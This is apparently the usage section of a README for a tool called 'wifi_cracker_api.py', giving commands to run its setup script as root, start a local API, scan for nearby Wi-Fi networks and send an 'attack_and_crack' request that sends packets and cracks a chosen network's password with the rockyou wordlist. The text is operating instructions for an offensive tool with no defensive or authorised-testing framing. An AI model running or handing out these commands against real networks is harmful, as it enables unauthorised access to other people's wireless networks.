Requirements

chmod +x setup.sh
sudo ./setup.sh

Running the Script
Start the API

sudo python3 wifi_cracker_api.py

Access Endpoints
Scan for networks

curl -X GET http://127.0.0.1:5000/scan

Attack & Crack

curl -X POST http://127.0.0.1:5000/attack_and_crack -H "Content-Type: application/json" -d '{"network_index": 0, "npackets": 10, "wordlist": "/usr/share/wordlists/rockyou.txt"}'

6. Interacting with the Menu
Select 1 to scan for networks.
Select 2 to attack a network and crack its password.
Select 3 to exit.
